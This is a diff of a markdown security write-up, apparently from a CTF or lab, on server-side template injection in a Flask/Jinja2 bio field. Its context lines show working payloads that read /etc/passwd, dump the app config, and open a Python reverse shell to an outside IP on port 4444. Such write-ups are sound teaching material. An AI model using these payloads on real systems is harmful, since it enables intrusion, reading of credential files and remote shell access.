@@ -24,14 +24,14 @@ Surprisingly, the 7*7 which is equal to 49 is reflected in the bio. That’s mea
 
 How can attacker exploit this vulnerability? Inside {{}} syntax, attacker can put any command that will be executed by the server. First of all, we try to get the list of user by inserting below payload. It works
 
-```bash
+```
 {{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
 ```
 
 ![POC-otb](/img/cwae/rsa2.png){: w="400" h="400" }{: .normal }
 
 Other sensitive info that we can retrieve is also the config by using payload below:
-```bash
+```
 {{config.items()}}
 ```
 
@@ -42,7 +42,7 @@ We will try to get a reverse shell from this vulnerability. Using below payload,
 ![POC-otb](/img/cwae/rsa4.png){: w="400" h="400" }{: .normal }
 
 Then, we can send below payload to the bio input field. 
-```bash
+```
 {{''.__class__.__mro__[1].__subclasses__()[213](['python', '-c', 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("143.198.205.200",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);']) }}
 ```
 
